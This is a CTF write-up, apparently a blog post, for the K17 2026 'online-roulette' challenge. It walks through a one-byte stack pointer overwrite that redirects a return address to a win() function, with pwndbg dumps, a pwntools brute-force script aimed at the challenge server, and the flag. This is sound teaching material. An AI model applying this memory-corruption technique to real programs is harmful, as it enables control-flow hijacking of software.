@@ -1,0 +1,492 @@
+---
+title: "online-roulette"
+description: 'A beginner challenge'
+pubDate: '2026-9-16'
+heroImage: ''
+ctf: 'K17 2026'
+---
+
+### Disclaimer
+
+This is how I solved the challenge on my own, with every mistake I made and how I dealt with them.
+
+Also, this writeup was made after the CTF ended, so I don't have access to the remote anymore and I can't show you snapshots of the remote, but I will show you snapshots from my local machine.
+
+### Description
+
+*live roulette players keep complaining that they dont get enough spins per hour, so we are introducing ROULETTE ONLINE!!! despite the (small) house edge, this minibolt guy keeps winning???*
+
+*Note: We've added a debugging tool on the remote to help you out a bit. The SNAPSHOT() call will magically print out a view of the program stack. You can ignore the snapshot stuff in the code, it's just there to enable this functionality.*
+
+And we got a file:
+
+<p style="color: green;">chal.c</p>
+
+### Testing the binary
+
+```sh
+…/2026/k17 ❯ ./chal
+how long would you like your name to be?
+2
+
+> welcome to ONLINE ROULETTE
+>  - gamble as much as you want!
+>  - you have a 1-in-36 chance to double your wager! (tiny house edge so we can maintain infra costs)
+>  - enter `0` to quit the game
+
+[!] minibolt has breached the system
+[addr]> 0x7fffffffc758
+[value]> 39
+[!] we now return you to your regularly scheduled gambling
+
+wager> 50
+> better luck next time!
+
+damn no more money
+please leave your name as you leave
+> s
+```
+First, it asks us for a name length, then it asks us for an address, and then we can change the value at that address.
+(When I used netcat to connect to the remote, it also showed a stack snapshot, but since I'm writing this after the remote went down, I can't show it to you)
+
+So let's take a look at the code and see what it does:
+
+```c
+int main(void) {
+    srand(time(NULL));
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+
+    int balance = 10;
+    char name[20];
+    uint8_t name_length;
+
+    puts("how long would you like your name to be?");
+    scanf("%hhu", &name_length);
+    flush();
+    puts("");
+
+    if (name_length > 20) {
+        puts("bad number, get out");
+        exit(0);
+    }
+
+    // play the game hrm
+    game(&balance);
+    flush();
+
+    puts("please leave your name as you leave");
+    printf("> ");
+    fgets(name, name_length, stdin);
+
+    // check sentinel value
+    if (balance > 999999999) {
+        puts("whaaaaaa u r the goat");
+        win();
+    }
+
+    return 0;
+}
+```
+We can see in the `main` function that it asks us for a name length and then checks if it's greater than 20 — if it is, it exits. Then it calls the `game` function, asks us for our name, and finally checks if our `balance` is greater than 999999999. If it is, it calls `win()`.
+
+At first I thought I could set the name length to a value greater than 20 to overflow the `name` buffer, but then I realized the program exits if the length is greater than 20, so that won't work.
+
+So I decided to take a look at the `game` function to see what it does:
+
+```c
+void game(int *balance) {
+    int wager;
+
+    puts("> welcome to ONLINE ROULETTE");
+    puts(">  - gamble as much as you want!");
+    puts(">  - you have a 1-in-36 chance to double your wager! (tiny house edge so we can maintain infra costs)");
+    puts(">  - enter `0` to quit the game");
+    puts("");
+
+    // something to help you
+    puts("[!] minibolt has breached the system");
+    SNAPSHOT();
+
+    unsigned long addr;
+    unsigned int value;
+
+    printf("[addr]> ");
+    scanf("%lx", &addr);
+    if (addr > (uintptr_t)&wager) {
+        puts("intruder neutralised");
+    } else {
+        printf("[value]> ");
+        scanf("%u", &value);
+        flush();
+
+        *(unsigned char *)addr = (unsigned char)value;
+
+        SNAPSHOT();
+        puts("[!] we now return you to your regularly scheduled gambling\n");
+    }
+
+    // gambling time
+    printf("wager> ");
+    scanf("%d", &wager);
+
+    while (wager != 0) {
+        if (wager < 0) {
+            puts("invalid wager");
+            exit(0);
+        }
+
+        *balance -= wager;
+
+        SNAPSHOT();
+
+        int lotto = (rand() % 36) + 1;
+
+        if (lotto == 1) {
+            puts("> congrats! you won!!!\n");
+            *balance += 2 * wager;
+        } else {
+            puts("> better luck next time!\n");
+        }
+
+        if (*balance < 0) {
+            puts("damn no more money");
+            return;
+        }
+
+        printf("wager> ");
+        scanf("%d", &wager);
+    }
+
+    puts("> thx for the money\n");
+}
+```
+
+As we can see, `balance` is a pointer to an integer and `wager` is a regular integer. The program asks us for an address and then checks if that address is greater than the address of `wager`. If it is, it prints "intruder neutralised". Otherwise, it asks us for a value and writes that single byte to the address we provided. So I thought I could change the value of `balance` directly by providing the address of `balance` and setting it to something greater than 999999999, so the final check in `main` would call `win()`.
+
+But if we try that, we can see that the address of the `balance` variable is actually greater than the address of `wager`, so the check blocks us and we can't overwrite `balance` directly.
+
+```sh
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────[ LAST SIGNAL ]──────────────────────────────────────────────────────────
+Breakpoint hit at 0x555555555342
+──────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
+ RAX  0
+ RBX  0
+ RCX  0
+ RDX  0x555555556116 ◂— 0x72746e6900786c25 /* '%lx' */
+ RDI  0x555555556116 ◂— 0x72746e6900786c25 /* '%lx' */
+ RSI  0x7fffffffc770 {addr} ◂— 1
+ R8   8
+ R9   0
+ R10  0
+ R11  0x246
+ R12  0x7fffffffc8f8 —▸ 0x7fffffffd0d0 ◂— '/home/cmos/Documents/CTF/2026/k17/chal'
+ R13  1
+ R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe3c0 —▸ 0x555555554000 ◂— 0x10102464c457f
+ R15  0x555555557dd8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555551a0 (__do_global_dtors_aux) ◂— endbr64
+ RBP  0x7fffffffc780 —▸ 0x7fffffffc7c0 —▸ 0x7fffffffc870 —▸ 0x7fffffffc8d0 ◂— 0
+ RSP  0x7fffffffc750 ◂— 0
+ RIP  0x555555555342 (game+159) ◂— call __isoc23_scanf@plt
+───────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────
+ ► 0x555555555342 <game+159>    call   __isoc23_scanf@plt          <__isoc23_scanf@plt>
+        rdi: 0x555555556116 ◂— 0x72746e6900786c25 /* '%lx' */
+        rsi: 0x7fffffffc770 {addr} ◂— 1
+        rdx: 0x555555556116 ◂— 0x72746e6900786c25 /* '%lx' */
+        rcx: 0
+
+   0x555555555347 <game+164>    mov    rax, qword ptr [rbp - 0x10]
+   0x55555555534b <game+168>    lea    rdx, [rbp - 0x1c]
+   0x55555555534f <game+172>    cmp    rdx, rax
+   0x555555555352 <game+175>    jae    game+194                    <game+194>
+
+   0x555555555354 <game+177>    lea    rax, [rip + 0xdbf]              RAX => 0x55555555611a ◂— 'intruder neutralised'
+   0x55555555535b <game+184>    mov    rdi, rax                        RDI => 0x55555555611a ◂— 'intruder neutralised'
+   0x55555555535e <game+187>    call   puts@plt                    <puts@plt>
+
+   0x555555555363 <game+192>    jmp    game+270                    <game+270>
+    ↓
+   0x5555555553b1 <game+270>    lea    rax, [rip + 0xdc4]              RAX => 0x55555555617c ◂— 0x203e7265676177 /* 'wager> ' */
+   0x5555555553b8 <game+277>    mov    rdi, rax                        RDI => 0x55555555617c ◂— 0x203e7265676177 /* 'wager> ' */
+────────────────────────────────────────────────────────[ SOURCE (CODE) ]─────────────────────────────────────────────────────────
+In file: /home/cmos/Documents/CTF/2026/k17/chal.c:43
+   38
+   39     unsigned long addr;
+   40     unsigned int value;
+   41
+   42     printf("[addr]> ");
+ ► 43     scanf("%lx", &addr);
+   44     if (addr > (uintptr_t)&wager) {
+   45         puts("intruder neutralised");
+   46     } else {
+   47         printf("[value]> ");
+   48         scanf("%u", &value);
+   49         flush();
+   50
+   51         *(unsigned char *)addr = (unsigned char)value;
+────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffc750 ◂— 0
+01:0008│-028 0x7fffffffc758 {balance} —▸ 0x7fffffffc79c ◂— 0xa /* '\n' */
+02:0010│-020 0x7fffffffc760 ◂— 0
+03:0018│-018 0x7fffffffc768 {value} —▸ 0x7fffffffc8f8 —▸ 0x7fffffffd0d0 ◂— '/home/cmos/Documents/CTF/2026/k17/chal'
+04:0020│ rsi 0x7fffffffc770 {addr} ◂— 1
+05:0028│-008 0x7fffffffc778 ◂— 0xf36cba864ae8ac00
+06:0030│ rbp 0x7fffffffc780 —▸ 0x7fffffffc7c0 —▸ 0x7fffffffc870 —▸ 0x7fffffffc8d0 ◂— 0
+07:0038│+008 0x7fffffffc788 —▸ 0x5555555555d4 (main+214) ◂— call flush
+──────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────
+ ► 0   0x555555555342 game+159
+   1   0x5555555555d4 main+214
+   2   0x7ffff7c27781 __libc_start_call_main+129
+   3   0x7ffff7c278b9 __libc_start_main+137
+   4   0x555555555125 _start+37
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> c
+Continuing.
+0x7fffffffc79c
+intruder neutralised
+wager>
+```
+As you can see, if we try to overwrite `balance` directly, it just prints "intruder neutralised".
+
+Another approach I considered was trying to win the game by exploiting the random number generator — basically predicting the next number. But the program doesn't ask you to guess the number, it just generates a random number itself and checks if it's equal to 1, so that won't work either.
+
+But then I thought: if the program lets me change the value at any lower address, there must be a reason — the intended solution has to be to find a way to change `balance` indirectly.
+
+After testing the program for like an hour, I noticed something interesting.
+
+```sh
+
+00:0000│ rsp 0x7fffffffc750 ◂— 0
+01:0008│-028 0x7fffffffc758 {balance} —▸ 0x7fffffffc79c ◂— 0xa /* '\n' */
+02:0010│-020 0x7fffffffc760 ◂— 0
+03:0018│-018 0x7fffffffc768 {value} —▸ 0x7fffffffc8f8 —▸ 0x7fffffffd0d0 ◂— '/home/cmos/Documents/CTF/2026/k17/chal'
+04:0020│ rsi 0x7fffffffc770 {addr} ◂— 1
+05:0028│-008 0x7fffffffc778 ◂— 0xf36cba864ae8ac00
+06:0030│ rbp 0x7fffffffc780 —▸ 0x7fffffffc7c0 —▸ 0x7fffffffc870 —▸ 0x7fffffffc8d0 ◂— 0
+07:0038│+008 0x7fffffffc788 —▸ 0x5555555555d4 (main+214) ◂— call flush
+
+```
+The value at `0x7fffffffc758` is the `balance` pointer itself — it points to where `balance` is stored (`0x7fffffffc79c`). So if we can make that pointer point somewhere else, we might be able to change the value at that new location instead of `balance`.
+
+But at that moment I realized it only lets us change a single byte, so I can't overwrite the whole pointer.
+
+So I spent like 15 minutes trying to figure out what to do.
+
+Then I noticed this part of the code:
+
+```c
+ *balance -= wager;
+ 
+ ```
+This dereferences the `balance` pointer and subtracts our `wager` from whatever it points to. So if we can make the `balance` pointer point to a different location, we can subtract an arbitrary value from that location and effectively control what gets written there.
+
+So what if we make it point to the saved return address of `main`, which is at:
+```sh
+07:0038│+008 0x7fffffffc788 —▸ 0x5555555555d4 (main+214) ◂— call flush
+```
+If we change the pointer to point to that address and then bet an amount equal to the offset between the current return address and the `win` function, the `*balance -= wager` will subtract that offset from the return address and redirect it to `win`.
+Then on the next loop iteration we just bet `0` to quit the game, and when `game()` returns, instead of going back to `main+214`, it will return to `win()` and we'll get the flag.
+
+But what's the offset between the pointer target and the return address? Now I had to figure it out.
+
+```sh
+
+pwndbg> p main
+$1 = {int (void)} 0x14fe <main>
+pwndbg> p win
+$2 = {void (void)} 0x1219 <win>
+```
+As we can see, these are the addresses of `main` and `win`, so we can calculate the offset between them:
+
+```sh
+pwndbg> p 0x14fe - 0x1219
+$3 = 741
+```
+But wait, the return address is not at the beginning of `main`, it's at `main+214`, so we have to add 214 to the offset:
+
+```sh
+pwndbg> p 741 + 214
+$4 = 955
+```
+So the distance from the return address (`main+214`) to `win` is 955. If we bet 955, we'll change the return address to point to `win`.
+
+So, looking again at our stack:
+
+```sh
+00:0000│ rsp 0x7fffffffc750 ◂— 0
+01:0008│-028 0x7fffffffc758 {balance} —▸ 0x7fffffffc79c ◂— 0xa /* '\n' */
+02:0010│-020 0x7fffffffc760 ◂— 0
+03:0018│-018 0x7fffffffc768 {value} —▸ 0x7fffffffc8f8 —▸ 0x7fffffffd0d1 ◂— '/home/cmos/Documents/CTF/2026/k17/chal'
+04:0020│ rsi 0x7fffffffc770 {addr} ◂— 1
+05:0028│-008 0x7fffffffc778 ◂— 0xdf57ba7f33cb4700
+06:0030│ rbp 0x7fffffffc780 —▸ 0x7fffffffc7c0 —▸ 0x7fffffffc870 —▸ 0x7fffffffc8d0 ◂— 0
+07:0038│+008 0x7fffffffc788 —▸ 0x5555555555d4 (main+214) ◂— call flush
+```
+We can see that the `balance` pointer is stored at `0x7fffffffc758` and it currently points to `0x7fffffffc79c`, while the return address is at `0x7fffffffc788`. The last byte of the pointer is `0x9c`, and the last byte of the return address location is `0x88`. So if we overwrite only the last byte of the pointer with `0x88` (136), it will point to `0x7fffffffc788` — exactly where the return address is stored.
+
+So I tested it in pwndbg:
+
+First I sent the address:
+
+```sh
+0x7fffffffc758
+```
+Then I sent the value:
+
+```sh
+0x88
+```
+Now we can see the pointer now points to the return address:
+
+```sh
+01:0008│-028   0x7fffffffc758 {balance} —▸ 0x7fffffffc788 —▸ 0x5555555555d4 (main+214) ◂— call flush
+```
+And now when we bet 955, it will change the return address to point to the `win` function:
+
+```sh
+01:0008│-028   0x7fffffffc758 {balance} —▸ 0x7fffffffc788 —▸ 0x555555555219 (win) ◂— push rbp
+```
+So let's continue and see if it works:
+
+```sh
+> thx for the money
+
+flag{Pedro_Pica_Piedra}
+```
+
+NOW I GOT THE FLAG, and I was so happy because I had spent like 2 hours trying to figure out what to do.
+
+BUT when I tested the exploit on the remote it said:
+
+```sh
+child died
+```
+
+It didn't work, so what happened?
+
+Well, we can confirm that we did change the pointer correctly.
+
+The most reasonable explanation is that the offset on the remote is different.
+
+Now I had to find the offset for the remote, and at first I thought it would be close to my local one, so I started testing manually from offset 935 to 960. It took me like 15 minutes.
+
+But it didn't work 🫠
+
+So I changed my strategy. I decided to make a script that would try all offsets from 750 to 925 and check if the flag appeared in the output.
+
+
+```python
+from pwn import *
+
+for i in range(750, 925):
+    for j in range(2):
+        p = remote("chal.secso.cc", 4000)
+        p.recvuntil("name to be?")
+        p.sendline(b"2")
+
+        p.recvuntil(b"0001")
+        balance_address = p.recvuntil(b"0001").split(b" ")[-3][7:-1]
+        val = p.recvuntil(b"[main]").split(b" ")
+        main_addr = val[-6][7:-1]
+        main_val = val[-5][:-1]
+        p.info(f"Index {i}")
+        p.info(f"Balance Addres {balance_address}")
+        p.info(f"Main ret Addres {main_addr}")
+        p.info(f"Min val: {main_val}")
+        valueToChange = int(b"0x" + main_addr[-2:], 16)
+        p.info(f"Value to change {valueToChange}")
+        p.recvuntil(b"[addr]> ")
+        p.sendline(balance_address)
+        p.recvuntil(b"[value]>")
+        p.sendline(str(valueToChange))
+        p.recvuntil(b"wager>")
+        p.sendline(str(i))
+        changed_main_address = p.recvuntil(b"[main]").split(b" ")[-5][:-1]
+        p.info(f"Changed main Address {changed_main_address}")
+        p.recvuntil(b"wager>")
+        p.sendline(b"0")
+        funciono = p.recvall(timeout=2)
+        if b"child died" in funciono or b"please" in funciono:
+            if b"k17" in funciono:
+                print("Funcionooooooooooooooooooooo")
+            print("No funciono :(")
+            p.close()
+        else:
+            print("Algo Diferente")
+            p.info(f"Value to change {valueToChange}")
+            p.info(f"Balance Addres {balance_address}")
+            p.info(f"Main ret Addres {main_addr}")
+            print(funciono)
+            p.interactive()
+            break
+
+```
+The reason for the two loops is that the outer loop is for the offset, and the inner loop tries twice because sometimes the remote address is different. For example:
+
+If the address we need to overwrite is `0x7fffffffc7c7` and the return address of `main` is at `0x7fffffffc800`, remember we can only change the last byte. So if we change the last byte to `0x00` it will point to `0x7fffffffc700`, which is not the address we want, so we have to try again until the last byte lines up.
+
+### The Exploit Running
+
+```sh
+[+] Opening connection to chal.secso.cc on port 4000: Done
+[*] Index 853
+[*] Balance Addres b'0x7ffccc69a438'
+[*] Main ret Addres b'0x7ffccc69a468'
+[*] Min val: b'0x000000000040156'
+[*] Value to change 104
+[*] Changed main Address b'0x000000000040121'
+[+] Receiving all data: Done (69B)
+[*] Closed connection to chal.secso.cc port 4000
+Algo Diferente
+[*] Value to change 104
+[*] Balance Addres b'0x7ffccc69a438'
+[*] Main ret Addres b'0x7ffccc69a468'
+b' > thx for the money\n\nK17{th1sU:\xc9\xef\xe7\x7f\x00\x00\xc0E\xe0\xef\xe7\x7f\x00\x00\xe0\x1e\xe0\xef\xe7\x7f\x00\x00.\x00\x00\x00\x00\x00\x00\x00\x90\xa3i\xcc\xfc\x7f\n'
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+[+] Opening connection to chal.secso.cc on port 4000: Done
+[*] Index 859
+[*] Balance Addres b'0x7ffd0b82bfb8'
+[*] Main ret Addres b'0x7ffd0b82bfe8'
+[*] Min val: b'0x000000000040156'
+[*] Value to change 232
+[*] Changed main Address b'0x000000000040156'
+[+] Receiving all data: Done (60B)
+[*] Closed connection to chal.secso.cc port 4000
+No funciono :(
+[+] Opening connection to chal.secso.cc on port 4000: Done
+[*] Index 860
+[*] Balance Addres b'0x7ffd61ef7bc8'
+[*] Main ret Addres b'0x7ffd61ef7bf8'
+[*] Min val: b'0x000000000040156'
+[*] Value to change 248
+[*] Changed main Address b'0x000000000040156'
+[+] Receiving all data: Done (60B)
+[*] Closed connection to chal.secso.cc port 4000
+No funciono :(
+[+] Opening connection to chal.secso.cc on port 4000: Done
+[*] Index 860
+[*] Balance Addres b'0x7ffd78aeb6e8'
+[*] Main ret Addres b'0x7ffd78aeb718'
+[*] Min val: b'0x000000000040120'
+[+] Receiving all data: Done (69B)
+[*] Closed connection to chal.secso.cc port 4000
+Algo Diferente
+[*] Value to change 24
+[*] Balance Addres b'0x7ffd78aeb6e8'
+[*] Main ret Addres b'0x7ffd78aeb718'
+b' > thx for the money\n\nK17{th1s_minib0lt_guy_must_b3_rlly_lucky_huh}\n\n'
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+$
+```
+From the output we can see that the flag is:
+
+### Flag
+
+```sh
+K17{th1s_minib0lt_guy_must_b3_rlly_lucky_huh}
+``` 
+
+![pwned gandalf](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNXc4bzRiaTc2Nmd2dGU4aDIyaWk1ZmJsdThucjRkbWVtMmI4aTdsayZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/I0EvMPfvcfZoZY25ru/giphy.gif)
